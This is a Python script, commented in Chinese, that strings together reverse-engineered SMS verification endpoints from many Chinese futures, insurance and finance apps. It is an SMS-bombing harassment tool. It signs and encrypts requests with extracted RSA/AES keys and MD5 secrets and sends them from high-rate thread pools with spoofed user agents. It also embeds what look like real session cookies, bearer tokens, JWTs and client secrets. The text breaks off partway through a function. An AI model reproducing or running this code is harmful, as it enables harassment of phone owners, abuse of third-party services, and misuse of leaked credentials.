import streamlit as st  # <--- 必须加上这一行！
import requests
import json
import base64
import re
import threading
import sys
import time
import random
import hashlib
import uuid
import binascii
import os
import hmac
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Cipher import DES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ... (中间的函数代码保持不变，不要动) ...
# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------ 全局配置 ------------------
exit_flag = False
print_lock = threading.Lock()  # 仅用于启动/退出等关键信息打印

# 核心配置：可根据服务器性能调整
PLATFORM_THREAD_POOL_SIZE = 100  # 单平台请求线程数（固定100）
PLATFORM_REQUESTS_PER_SECOND = 100  # 每个平台每秒请求次数
MINUTE_TASK_MAX_THREADS = 1000  # 分钟接口任务最大线程数（可大幅提高）
MINUTE_CYCLE_DURATION = 60  # 分钟循环周期（秒）

# 线程池全局实例
platform_executor = None
minute_executor = None

# ------------------ 随机User-Agent生成器 ------------------
def random_user_agent():
    devices = [
        "SM-G9910", "SM-G9980", "SM-S9080", "iPhone14,3", "iPhone15,3",
        "Mi 10", "Mi 11", "Mi 12", "PJE110", "V2024A", "RMX2202", "POT-LX1"
    ]
    android_versions = ["10", "11", "12", "13", "14", "15"]
    chrome_versions = [
        "98.0.4758.102", "99.0.4844.73", "100.0.4896.127",
        "101.0.4951.61", "102.0.5005.78", "103.0.5060.114",
        "104.0.5112.97", "105.0.5195.58", "106.0.5249.126",
        "107.0.5304.105", "108.0.5359.128", "109.0.5414.117",
        "110.0.5481.153", "111.0.5563.147", "112.0.5615.136",
        "113.0.5672.76", "114.0.5735.196", "115.0.5790.166",
        "116.0.5845.187", "117.0.5938.92", "118.0.5993.88",
        "119.0.6045.163", "120.0.6099.109", "121.0.6167.85",
        "122.0.6261.112", "123.0.6312.59", "124.0.6367.82",
        "125.0.6422.78", "126.0.6478.122", "127.0.6533.64",
        "128.0.6587.99", "129.0.6668.118", "130.0.6725.153",
        "131.0.6725.153", "132.0.6725.153", "133.0.6725.153",
        "134.0.6998.136"
    ]
    wechat_versions = [
        "8.0.20", "8.0.25", "8.0.30", "8.0.35", "8.0.40",
        "8.0.45", "8.0.50", "8.0.55", "8.0.61"
    ]

    device = random.choice(devices)
    android_ver = random.choice(android_versions)
    chrome_ver = random.choice(chrome_versions)
    wechat_ver = random.choice(wechat_versions)
    hex_code = random.choice(["0x28003D34", "0x28003D35", "0x28003D36", "0x28003D37"])

    return (f"Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/TP1A.220905.001; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver} "
            f"Mobile Safari/537.36 XWEB/{random.randint(1000000, 9999999)} "
            f"MMWEBSDK/202{random.randint(1,5)}{random.randint(1,12):02d}{random.randint(1,31):02d} "
            f"MMWEBID/{random.randint(1000, 9999)} MicroMessenger/{wechat_ver}({hex_code}) "
            f"WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64")

# ------------------ 通用请求函数（无阻塞，无结果） ------------------
def make_request(url, method="GET", params=None, data=None, headers=None, cookies=None):
    """通用请求函数 - 只发送，不关心结果，不抛异常"""
    try:
        if method.upper() == "GET":
            requests.get(
                url,
                params=params,
                headers=headers,
                cookies=cookies,
                timeout=1,  # 超短超时，减少阻塞
                verify=False,
                stream=False  # 不下载响应体，加快速度
            )
        else:
            requests.post(
                url,
                data=data,
                headers=headers,
                cookies=cookies,
                timeout=1,
                verify=False,
                stream=False
            )
    except:
        pass  # 忽略所有异常
# ------------------- 中粮期货短信发送类（简化版·请求即成功） -------------------
class ZhongliangFuturesSMSSender:
    def __init__(self):
        """初始化：加载固定配置与RSA公钥"""
        # 1. 固定接口配置（100%复用你提供的参数）
        self.API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
        self.FIXED_QSID = "750"
        self.REQUEST_HEADERS = {
            'Host': "ftoem.10jqka.com.cn:9443",
            'User-Agent': "GZhongLiang_Futures/ (Royal Flush) hxtheme/0 innerversion/ZLFG037.08.301.10.32 logintype/0 hidenexamine/1 userid/ appid/QcxBMUALfbVcrOWh",
            'Accept-Encoding': "gzip",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        # 2. RSA公钥（复用你提供的Base64值）
        self.RSA_PUBLIC_KEY_BASE64 = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoZuhgxGl8g0N7O5AvCFkW8Z/8u7Wrv1QMuNLX/NCMAE3NxfG1/9l1Ql5w2C8KqHxKI/bmpQPDBn4Wsa8qShvYO2fJwKKa7OoM5IzkNkbbxTXxKiECtSrbj9zOowEV6QaqkUtyg3c6pbpyrjHG71QwvxVv2G4sTsnjLdIQZpIyYwIDAQAB"
        # 3. 加载RSA公钥（初始化时完成，避免重复加载）
        self.public_key = self._load_public_key()

    def _load_public_key(self):
        """加载RSA公钥（复用你原有的逻辑，仅简化异常处理）"""
        try:
            public_key_der = base64.b64decode(self.RSA_PUBLIC_KEY_BASE64)
            return RSA.import_key(public_key_der)
        except Exception:
            return None  # 异常时返回None，后续加密直接触发失败

    def rsa_encrypt(self, plaintext):
        """RSA加密（复用你原有的逻辑，适配请求即成功需求）"""
        if not self.public_key:
            return None
        try:
            cipher = PKCS1_v1_5.new(self.public_key)
            encrypted_bytes = cipher.encrypt(plaintext.encode('utf-8'))
            return base64.b64encode(encrypted_bytes).decode('utf-8')
        except Exception:
            return None

    def send_sms(self, phone):
        """发送短信：请求即视为成功，无响应打印与校验"""
        # 1. 加密手机号
        encrypted_mobile = self.rsa_encrypt(phone)
        if not encrypted_mobile:
            return False  # 加密失败视为请求失败

        # 2. 构造请求参数
        payload = {
            'encryptMobile': encrypted_mobile,
            'qsId': self.FIXED_QSID
        }

        # 3. 发送请求（无异常即视为成功）
        try:
            requests.post(
                self.API_URL,
                data=payload,
                headers=self.REQUEST_HEADERS,
                verify=False,
                timeout=30
            )
            return True  # 请求发出即返回成功
        except Exception:
            return False  # 仅异常时返回失败

# ------------------- 单函数适配（兼容现有接口模块格式） -------------------
def zhongliang_futures_send_sms(phone):
    """单手机号函数：适配现有多接口配置列表，仅接收phone参数返回布尔值"""
    sender = ZhongliangFuturesSMSSender()
    return sender.send_sms(phone)
# ------------------- 厦门融达RSA加密短信模块（简化版） -------------------
def xiamenrongda_send_sms(phone):
    """厦门融达接口：RSA/ECB/PKCS1Padding加密+请求发送即视为成功"""
    try:
        # 1. 接口与加密核心配置（100%复用你提供的抓包&日志参数）
        API_URL = "https://rdapp.xmrd.net/gateway/security/code/direct/sms"
        RSA_PUBLIC_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmMiLb4dfBkI/alsBJtnAVZZnEGWxPQE0FR2mVtJ4nIFeZ/UyOhjUfTL4N5QWzorkniI8jifvbKARP8f5s3uuVxipkZkjHBytBj7VNv3K8H4LXaP6Jn3fhyULHo1CDnyrXuq9qwuj15ooljcE172JALQ7hfdre1MvPCImFrKw8Vaf/7X1Bsh38Q/J21R+gWkTodhG4QJFs5K5ZDbf2GHueE2HtPKaAQ35cNz8e/6SxUjUFwts8BNPknqUkn5tbcPVIzHCq43xz9iFUglI80XLLe54DnkB967pbweq8lx9qn14dE9L24GexgloMQRvaTtmBvpJ2yVou159lGDBJl+WYwIDAQAB"
        REQUEST_HEADERS = {
            'User-Agent': "okhttp/5.0.0-alpha.11",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-id-token': "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjQ4NzMxNTE2MTYsInVzZXJJZCI6ImFub255bW91cyJ9.jcu4gpviXGMY5yn2JnIleBk35boeWdZd-CqTrjF75qA",
            'x-platform': "android",
            'x-model': "OPD2404",
            'x-app-version': "2.2.2",
            'x-device-num': "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
            'x-os-version': "15",
            'x-cid': "160a3797c92d189e32c",
            'content-type': "application/json; charset=UTF-8"
        }

        # 2. RSA加密（完全复用你提供的正确逻辑，确保加密结果一致）
        def rsa_encrypt_inner(phone_str):
            public_key_bytes = base64.b64decode(RSA_PUBLIC_KEY_BASE64)
            rsa_public_key = RSA.importKey(public_key_bytes)
            cipher = PKCS1_v1_5.new(rsa_public_key)
            encrypted_bytes = cipher.encrypt(phone_str.encode("utf-8"))
            return base64.b64encode(encrypted_bytes).decode("utf-8")

        # 3. 构造请求（复用你的JSON格式，添加1秒延迟防高频封禁）
        encrypted_phone = rsa_encrypt_inner(phone)
        payload = {"phone": encrypted_phone}
        time.sleep(1)  # 保留你设置的延迟逻辑，避免接口封禁
        requests.post(
            url=API_URL,
            json=payload,  # 用json参数自动序列化，比json.dumps更简洁（结果一致）
            headers=REQUEST_HEADERS,
            timeout=15,
            verify=False  # 适配SSL验证问题
        )

        # 4. 简化结果判断：请求发送（无异常）即返回成功
        return True
    except Exception:
        # 仅网络错误、超时、加密异常等返回失败
        return False

# ------------------- 平安期货RSA加密短信请求模块（简化版） -------------------
def pingan_futures_send_sms(phone):
    """平安期货接口：RSA加密手机号+请求发送即视为成功，无需响应判断"""
    try:
        # 1. 接口与加密核心配置（复用原脚本固定参数）
        API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/pinganOauth/send"
        # RSA加密配置（标准PEM格式包装，匹配PKCS1Padding）
        RSA_PUBLIC_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7yRhpJe7xf2th+9O1cmBCE+3OrB+hNZfuax6rTJ7if0uqGsFkfDRYJCldm4OXE+WjPLJQaG9DlCjMCB/SQFwa/dihzdgaV27Kpdq2FR/Uat1L+WQ+xwik5AhMKT5LnL0Iw9rNpXPzAxBBnfAhrc3PsTbBwTE4oaQeWC6dDMB/4IBB+C3w2cClW3Ut6E/qPydQwbYRtNWc4XZBLGJKrurWwdLRYKDWbF8SeKvvnyQipATRJ7D+JocvOY+EP6FiUAA0kGFG+4/P0vQNCaRexZFKQKjHKGR5nunJnmJtsjar/nix7VZyenWjEfnPkf7IwxZIZqpCOJb8JBfozRztHMDiwIDAQAB"
        FIXED_PAYLOAD = {'qsId': "734"}  # 固定qsId参数
        REQUEST_HEADERS = {
            'Host': "ftoem.10jqka.com.cn:9443",
            'User-Agent': "GPingA_Futures/2.0.4 (Royal Flush) hxtheme/0 innerversion/PAFG037.08.301.10.32 logintype/0 hidenexamine/1 userid/-816532261 appid/md3405I6iKlpoMHU",
            'Accept-Encoding': "gzip",
            'Cookie': "user=MDptdF9veTdtOWxnN2o6Ok5vbmU6NTAwOjgyNjUzMjI2MTo3LDExMTExMTExMTExLDQwOzQ0LDExLDQwOzYsMSw0MDs1LDEsNDA7MSwxMDEsNDA7MiwxLDQwOzMsMSw0MDs1LDEsNDA7OCwwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMSw0MDsxMDIsMSw0MDo6Ojo4MTY1MzIyNjE6MTc2MTc3NzE3ODo6OjE3NjE2Njk4NDA6MjY3ODQwMDowOjE5MmI2OTNjMzMwOGEzMDNmMzFmOGI2YmMzODA3ZTM3NTo6MA%3D%3D; userid=816532261; u_name=mt_oy7m9lg7j; sess_tk=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6InNlc3NfdGtfMSIsImJ0eSI6InNlc3NfdGsifQ.eyJqdGkiOiI3NWUzMDczOGJjYjZmODMxM2YzMDhhMzBjMzkzYjY5MjEiLCJpYXQiOjE3NjE3NzcxNzgsImV4cCI6MTc2NDQ1NTU3OCwic3ViIjoiODE2NTMyMjYxIiwiaXNzIjoidXBhc3MuMTBqcWthLmNvbS5jbiIsImF1ZCI6IjIwMjMwODA0OTA3NTEyOTIiLCJhY3QiOiJtdCIsImN1aHMiOiI2M2M1ZTk4NGJjMzU3NDIyOTU3NmEwMTRjNjFkZDcyYTg0OTQ4NGY5YTI5ZmZkNjc5ZWU0Njc4MDQ5MDg3NWNkIn0.-XQ3G4IWa4bUheeV2hOqraq0-hk2R0N0jH-dCtzJUVByLLmWuTh2yjti9gfPZZ9OqcVSR_zWN1AvaNjLLQ2TTQ; cuc=044389e2ed5e405a96d0bd06972ba600; escapename=mt_oy7m9lg7j; ticket=6f55fdd4e78b4f8b65d495dc20a895ab; user_status=0"
        }

        # 2. RSA加密（保留原脚本标准PEM格式+PKCS1Padding逻辑）
        pem_public_key = f"-----BEGIN PUBLIC KEY-----\n{RSA_PUBLIC_KEY_BASE64}\n-----END PUBLIC KEY-----"
        rsa_key = RSA.importKey(pem_public_key)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted_bytes = cipher.encrypt(phone.encode('utf-8'))
        encrypted_mobile = base64.b64encode(encrypted_bytes).decode('utf-8')

        # 3. 构造form-data请求体并发送
        payload = {
            **FIXED_PAYLOAD,
            'encryptMobile': encrypted_mobile  # 动态填入加密手机号
        }
        requests.post(
            url=API_URL,
            data=payload,
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )

        # 4. 简化结果判断：请求发送（无异常）即返回成功
        return True
    except Exception:
        # 仅网络错误、超时等异常时返回失败
        return False
# ------------------- 中民保险MD5签名短信请求模块（简化版） -------------------
def zhongmin_insurance_send_sms(phone):
    """中民保险接口：MD5签名+请求发送即视为成功，无需响应判断"""
    try:
        # 1. 接口与签名核心配置（复用原脚本固定参数）
        API_URL = "https://interface.insurance-china.com/SendCode_SMS"
        SECRET_KEY = "zhongmin_zm123"  # 固定签名密钥（逆向提取）
        FIXED_PARAMS = {'type': 3}  # 固定业务类型参数
        REQUEST_HEADERS = {
            'User-Agent': "zbt_Android",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Accept-Language': "zh-CN,zh;q=0.8",
            'Authorization': "bearer vzf9gzgVleLopZeBszTUggNeurQMxxpSpe5jKOYQOseG8XQ0XbvTE4l5Nqbplf_xYVp0NIPizSpglX6nNt6wS8V0FyKbLnn71qFdFZv5_W7XjRLZvewBxz92I6n5LeLGv_pu2eXmeQmVYgr8VTivPZv8pHM8m9DGy77zO4pv1lwnfht6lPwGkEt3XpFBzbIll2uo0KhyYiyyM1pQk2ulum0mvnzb-tEGsVGxwtvQqV2S03igRMSnMeNVQ59gk4DHWOh9I4Kz9ih2pr4x84w50XtDbXSQrMWbuswDYX_7aaR0sxm1L6e2xbZV3v4SXaB_YMaPUDLn1-hLcABunEabGrrMX-KgbYHvTTOHDOcJP4w",
            'Cookie': "ASP.NET_SessionId=ujkjy54wzbxvlbqbztg3f2wf"
        }

        # 2. 生成MD5签名（复用原脚本逻辑：手机号+固定密钥）
        sign_plaintext = phone + SECRET_KEY
        sign = hashlib.md5(sign_plaintext.encode("utf-8")).hexdigest()

        # 3. 构造GET请求参数并发送
        params = {
            **FIXED_PARAMS,
            'phone': phone,
            'sign': sign
        }
        requests.get(
            url=API_URL,
            params=params,
            headers=REQUEST_HEADERS,
            timeout=10,
            verify=False  # 适配SSL验证问题
        )

        # 4. 简化结果判断：请求发送（无异常）即返回成功
        return True
    except Exception:
        # 仅网络错误、超时等异常时返回失败
        return False

# ------------------- 驰度数据MD5签名短信请求模块 -------------------
def chidudata_send_sms(phone):
    """驰度数据接口：实时生成时间戳+MD5大写签名，发送验证码"""
    try:
        # 1. 接口与签名核心配置（复用原脚本固定参数）
        API_URL = "https://api.chidudata.com/API/index.php/api/login/sendCode"
        FIXED_KEY = "2E2J4x0XKBs6PgTbq2BaMyFrE0OxadXP"  # 签名固定密钥
        REQUEST_HEADERS = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'userToken': "",
            'version': "250623",
            'appID': "1",
            'platform': "android",
            'sysVersion': "15",
            'Date': "57792-10-15 11:47:19 GMT+08:00",
            'androidId': "897adc7056d95b09",
            'deviceid': "897adc7056d95b09"
        }

        # 2. 实时生成参数（时间戳+MD5签名）
        # 生成13位毫秒级时间戳（与原脚本逻辑一致）
        timestamp = str(int(time.time() * 1000))
        # 按日志规则拼接签名内容：phone=手机号&timestamp=时间戳&key=固定密钥
        sign_content = f"phone={phone}&timestamp={timestamp}&key={FIXED_KEY}"
        # 生成MD5大写签名（匹配原脚本digest+hex+upper逻辑）
        md5 = hashlib.md5(sign_content.encode('utf-8'))
        sign = md5.digest().hex().upper()

        # 3. 构造form-data请求体并发送
        payload = {
            'timestamp': timestamp,
            'phone': phone,
            'sign': sign
        }
        response = requests.post(
            url=API_URL,
            data=payload,  # 接口为form-data格式，直接传字典
            headers=REQUEST_HEADERS,
            verify=False,  # 适配Termux环境SSL验证
            timeout=15
        )

        # 4. 结果判断（匹配原脚本响应校验逻辑）
        return True
    except Exception:
        return False


# ------------------- 广科贷RSA+MD5双验证短信请求模块 -------------------
def guangkedai_send_sms(phone):
    """广科贷接口：RSA加密生成x参数 + MD5签名生成sign参数，含响应解码与结果校验"""
    try:
        # 1. 接口核心配置（固定参数+动态生成）
        API_URL = "https://uoil.gkoudai.com/UserWebServer/sms/sendPhoneCode"
        CURRENT_TIMESTAMP = str(int(time.time() * 1000))  # 自动生成13位时间戳
        # RSA加密配置
        RSA_PUBLIC_KEY_BASE64 = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsfEjWk0jIPOqrfD943VzyGN0Z8SD3B1Fb8gL67bNo+epQaE6TqlP3j7exFdNdfgGwmFe/uX2m3HfDjjxShC8O5E3iuBwk8HECHO6+FeNZfhlJQqJ53YK39K2u1Bjuv325ZJllYea4NeqkrX4WkbSX7igys05Ziof9tmR2dQTcCwIDAQAB"
        RSA_PLAIN_TEMPLATE = f"phone={phone}&type=register&encript_key=RQACYEZPWMANBOLNXFZPUCMC&"
        # MD5签名配置
        SIGN_PARAMS = {
            "user_agent": "sojex/3.9.7(Anroid;15;2958*2120);UA198",
            "rtp": "sms/sendPhoneCode",
            "time": CURRENT_TIMESTAMP,
            "app_name": "gkoudai",
            "platform": "Android",
            "app_version": "3.9.7",
            "imei": "OnePlus_OP5D77L15526493830958",
            "rom": "OPD2404_15.0.0.601%28CN01%29",
            "device": "OPD2404_ANDROID_15"
        }
        # 请求头（动态填充sign和time）
        BASE_HEADERS = {
            'User-Agent': SIGN_PARAMS["user_agent"],
            'Accept-Encoding': "gzip",
            'app_version': SIGN_PARAMS["app_version"],
            'deviceinfo': "%7B%22FINGERPRINT%22%3A%22OnePlus%5C%2FOPD2404%5C%2FOP5D77L1%3A15%5C%2FUKQ1.231108.001%5C%2FU.1c8af84_1a785-8%3Auser%5C%2Frelease-keys%22%2C%22BRAND%22%3A%22OnePlus%22%2C%22MANUFACTURER%22%3A%22OnePlus%22%2C%22MODEL%22%3A%22OPD2404%22%2C%22HARDWARE%22%3A%22qcom%22%2C%22PRODUCT%22%3A%22OPD2404%22%2C%22DEVICE%22%3A%22OP5D77L1%22%7D",
            'device_name': "OP5D77L1",
            'device_type': "OPD2404",
            'rtp': SIGN_PARAMS["rtp"],
            'time': CURRENT_TIMESTAMP,
            'imei': SIGN_PARAMS["imei"],
            'ip_address': "192.168.3.23",
            'app_name': SIGN_PARAMS["app_name"],
            'platform': SIGN_PARAMS["platform"],
            'epid': "cc74d30d-fdce-4aea-8fdb-b23198706383",
            'channel': "oppo",
            'rom': SIGN_PARAMS["rom"],
            'device': SIGN_PARAMS["device"],
            'sign': "",
            'uid': ""
        }

        # 2. 生成RSA加密参数x
        public_key_pem = f"-----BEGIN PUBLIC KEY-----\n{RSA_PUBLIC_KEY_BASE64}\n-----END PUBLIC KEY-----"
        rsa_key = RSA.importKey(public_key_pem)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted_bytes = cipher.encrypt(RSA_PLAIN_TEMPLATE.encode("utf-8"))
        rsa_encrypted_x = base64.b64encode(encrypted_bytes).decode("utf-8")

        # 3. 生成MD5签名参数sign
        sign_content = (
            f"{SIGN_PARAMS['user_agent']}{SIGN_PARAMS['rtp']}{SIGN_PARAMS['time']}"
            f"{SIGN_PARAMS['app_name']}{SIGN_PARAMS['platform']}{SIGN_PARAMS['app_version']}"
            f"{SIGN_PARAMS['imei']}{SIGN_PARAMS['rom']}{SIGN_PARAMS['device']}"
        )
        md5_sign = hashlib.md5(sign_content.encode("utf-8")).hexdigest()
        BASE_HEADERS['sign'] = md5_sign

        # 4. 发送请求并处理响应
        payload = {'x': rsa_encrypted_x}
        response = requests.post(
            url=API_URL,
            data=payload,
            headers=BASE_HEADERS,
            verify=False,
            timeout=15
        )

        # 5. 结果校验（匹配原脚本的响应判断逻辑）
        if response.status_code == 200:
            try:
                # 解码Base64响应
                decrypted_resp = base64.b64decode(response.text).decode("utf-8")
                # 业务成功判断
                if "success" in decrypted_resp.lower() or "验证码" in decrypted_resp:
                    return True
                return False
            except:
                # 响应非Base64时，按状态码兜底
                return True
        elif response.status_code in [400, 403]:
            return False
        return False
    except Exception:
        return False

# ------------------- 财之道AES加密双验证码请求模块 -------------------
def caizhidao_send_sms(phone):
    """财之道接口：AES加密手机号并发送短信/语音验证码"""
    try:
        # 接口与加密核心配置
        API_URL = "https://ngssa.caizidao.com.cn/ngssa/api/auth/sms/v1/send"
        ENCRYPT_KEY_HEX = "4d6b6753484b4f594370346a374f614c2b426b42384f6455"
        ENCRYPT_IV_HEX = "65577734616e706b5a54423662336335"
        COMMON_HEADERS = {
            'User-Agent': "okhttp/4.9.0",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=utf-8",
            'x-device-id': "9938ba09309274d5e802bc4ad97ce979b",
            'x-device-type': "adr",
            'x-device-os-name': "android",
            'x-device-os-subname': "android",
            'x-device-os-version': "15",
            'x-device-band': "OPD2404",
            'x-app-version': "2.0.48",
            'x-channel': "oppo",
            'authorization': ""
        }

        # AES-CBC加密手机号
        key = bytes.fromhex(ENCRYPT_KEY_HEX)
        iv = bytes.fromhex(ENCRYPT_IV_HEX)
        padded_data = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_mobile = base64.b64encode(cipher.encrypt(padded_data)).decode("utf-8")

        # 发送短信验证码请求
        sms_payload = {"mobile": encrypted_mobile, "type": "0"}
        sms_response = requests.post(
            url=API_URL,
            data=json.dumps(sms_payload),
            headers=COMMON_HEADERS,
            verify=False,
            timeout=15
        )
        sms_success = sms_response.status_code == 200 and "success" in sms_response.text.lower()

        # 等待5秒后发送语音验证码（无论短信是否成功）
        time.sleep(6)
        voice_payload = {"mobile": encrypted_mobile, "receiveType": "voice"}
        voice_response = requests.post(
            url=API_URL,
            data=json.dumps(voice_payload),
            headers=COMMON_HEADERS,
            verify=False,
            timeout=15
        )
        voice_success = voice_response.status_code == 200 and "success" in voice_response.text.lower()

        return sms_success or voice_success
    except Exception:
        return False

# ------------------- 方正期货AES加密短信请求模块 -------------------
def founderfu_send_sms(phone):
    """方正期货接口：AES加密业务参数+服务器dd/sign验证，发送验证码"""
    try:
        # 1. 接口核心配置（固定参数+服务器动态数据）
        API_URL = "https://qhapi.founderfu.com:11443"
        AES_KEY_HEX = "3965594b4b36793138496e6756345141"
        AES_IV_HEX = "3965594b4b36793138496e6756345141"
        REQUEST_HEADERS = {
            'Host': "qhapi.founderfu.com:11443",
            'User-Agent': "okhttp-okgo/jeasonlzy",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Accept-Language': "zh-CN,zh;q=0.8"
        }
        # 服务器动态数据（每次运行前需从最新响应复制更新）
        SERVER_DD = "encryptdata=zqlcxby2e1ed%2fwi2%2fcwn%2bpg3yhysapols9nbv%2b4kb1scx9k9lbv5dz58y1p%2bqjfq%2f0matcnepd1hmug8yd7wjtxciekk1njgv3rrnzgwch74mke2rudput7hecgipwnkhufb%2b28njkivg9vt9%2bgwl%2bpcqz0em6bjvlcx%2byz1bx%2fzlfa5l98%2b%2ftrq2nch9hkxuzulcbbfknze7ffsgbgohzoovynopwnsz1y2ymwtppi%3dt=2025-10-27+07%3a16%3a30"
        SERVER_SIGN = "63352d64c6916beefe68556e27501f07"
        SERVER_TIMESTAMP = "2025-10-27 07:16:30"  # 从SERVER_DD的t=后提取

        # 2. AES加密业务参数（生成encryptdata）
        business_params = {
            "market": "oppo",
            "brokerId": "0007",
            "f": "fzqh",
            "v": "1",
            "h": "sendCode",
            "mobile": phone,
            "channel": "oppo",
            "appkey": "100241",
            "version": "1.3.7",
            "platform": "1"
        }
        business_json = json.dumps(business_params, separators=(',', ':'))
        key = bytes.fromhex(AES_KEY_HEX)
        iv = bytes.fromhex(AES_IV_HEX)
        padded_data = pad(business_json.encode("utf-8"), AES.block_size, style="pkcs7")
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encryptdata = base64.b64encode(cipher.encrypt(padded_data)).decode("utf-8")

        # 3. 验证encryptdata与服务器dd匹配性（避免sign验证失败）
        dd_encryptdata = "zqlcxby2e1ed/wi2/cwn+pg3yhysapols9nbv+4kb1scx9k9lbv5dz58y1p+qjfq/0matcnepd1hmug8yd7wjtxciekk1njgv3rrnzgwch74mke2rudput7hecgipwnkhufb+28njkivg9vt9+gwl+pcqz0em6bjvlcx+yz1bx/zlfa5l98+/trq2nch9hkxuzulcbbfknze7ffsgbgohzoovynopwnsz1y2ymwtppi="
        if encryptdata.lower() != dd_encryptdata:
            return False

        # 4. 构造请求体并发送
        final_payload = {
            't': SERVER_TIMESTAMP,
            'sign': SERVER_SIGN,
            'encryptdata': encryptdata
        }
        response = requests.post(
            url=API_URL,
            data=final_payload,
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )
        resp_json = response.json()
        # 验证业务成功（sign通过且验证码发送成功）
        return 
    except Exception:
        return False


# ------------------ 第一个脚本的AES加密函数 ------------------
def aes_ecb_encrypt(phone, key_hex):
    key = bytes.fromhex(key_hex)
    phone_bytes = phone.encode("ascii")
    padded_phone = pad(phone_bytes, AES.block_size, style="pkcs7")
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(padded_phone)
    return base64.b64encode(encrypted_bytes).decode("utf-8")
# ------------------- Talicai MD5签名短信请求模块 -------------------
def talicai_send_sms(phone):
    """Talicai接口：生成MD5签名并发送短信验证码"""
    try:
        # 接口固定参数
        API_URL = "https://www.talicai.com/api/v1/accounts/sms"
        SMS_TYPE = 1
        TYPE_VAL = 4
        SIGN_SECRET_KEY = "f09d5cd3!0390409e#98e6544dd16645%20"
        REQUEST_HEADERS = {
            'User-Agent': "Talicai/6.23.2(Android)",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-client-id': "aEN4LpN88LHcV1UCbnMMFtiu3dvHI2",
            'x-client-secret': "FGbq8SoN37idFwuQlxNsTnmbrRpp2k",
            'x-tlc-source': "oppo|Android|6.23.2|v1|dc24e67853cc44b8e6de2dda57b66f9b|OnePlus-OPD2404|15|WIFI|a79d169456029574|dc24e67853cc44b8e6de2dda57b66f9b|",
            'x-tlc-optimize': "yes",
            'content-type': "application/json; charset=utf-8"
        }

        # 生成时间戳和MD5签名
        current_timestamp = int(time.time() * 1000)
        sign_content = f"mobile={phone}|sms_type={SMS_TYPE}|timestamp={current_timestamp}|type={TYPE_VAL}{SIGN_SECRET_KEY}"
        md5 = hashlib.md5()
        md5.update(sign_content.encode("utf-8"))
        sign = md5.hexdigest()

        # 构造请求体并发送
        payload = {
            "mobile": phone,
            "sign": sign,
            "sms_type": SMS_TYPE,
            "timestamp": current_timestamp,
            "type": TYPE_VAL
        }
        response = requests.post(
            url=API_URL,
            data=json.dumps(payload),
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )
        return response.status_code == 200 and (response.json().get("code") == 0 or "success" in response.json().get("msg", "").lower())
    except Exception:
        return False

def send_hrhgstock(mobile):
    """第一个脚本的AES加密短信接口"""
    try:
        key_hex = "41594d74363448486b76435a734546787273337143773d3d"
        cookie = "acw_tc=0a45644e17615034794703872ed0973aeb3bb93c217095a944a459a562274c; JSESSIONID=8ABB0AFB83C0DCB2663587A9A1572E08"
        
        encrypted_phone = aes_ecb_encrypt(mobile, key_hex)
        
        url = "https://cms.hrhgstock.com/api/userNew/sendCode"
        payload = {"phone": encrypted_phone, "type": 1}
        headers = {
            'User-Agent': random_user_agent(),
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'authorization': "",
            'Cookie': cookie
        }
        
        response = requests.post(
            url=url,
            data=json.dumps(payload),
            headers=headers,
            verify=False,
            timeout=10
        )
        return True
    except:
        return False
# ------------------- CHINAHGC 接口的AES-CBC加密请求模块 -------------------
def aes_cbc_encrypt(plain_mobile, key_hex, iv_hex):
    """AES-CBC加密核心函数（与之前日志配置匹配）"""
    key = bytes.fromhex(key_hex)
    iv = bytes.fromhex(iv_hex)
    mobile_bytes = plain_mobile.encode("ascii")
    padded_data = pad(mobile_bytes, AES.block_size, style="pkcs7")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_bytes = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_bytes).decode("utf-8")

def send_chinahgc(mobile):
    """CHINAHGC接口（/uaa/oauth/sms-code）的请求函数"""
    try:
